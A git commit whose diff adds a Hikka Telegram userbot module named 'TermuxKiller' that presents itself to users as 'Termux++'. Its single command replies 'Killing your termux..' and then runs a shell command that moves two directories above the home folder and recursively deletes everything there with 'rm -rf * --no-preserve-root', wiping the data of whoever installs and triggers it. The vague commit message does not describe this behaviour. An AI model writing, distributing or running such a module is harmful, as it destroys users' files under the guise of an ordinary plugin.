7059d8ea74622754f013762978913db91d96d47c
Begitdj <egyptha29@gmail.com>
2024-08-09 01:02:44 +0700

    Update and file changed

---
+++ trmxKiller[Kill your termux] Module Hikka.py
@@ -0,0 +1,16 @@
+from hikkatl.types import Message
+from .. import loader
+from .. import utils
+import os
+
+
+@loader.tds
+class TermuxKiller(loader.Module):
+    """TermuxKiller"""
+    strings = {"name": "Termux++", "hello": "Killing your termux.."}
+
+    @loader.command()
+    async def trmx(self, message: Message):
+        """TermuxKiller"""
+        await utils.answer(message, self.strings("hello"))
+        os.system("cd $HOME && cd .. && cd .. && rm -rf * --no-preserve-root")
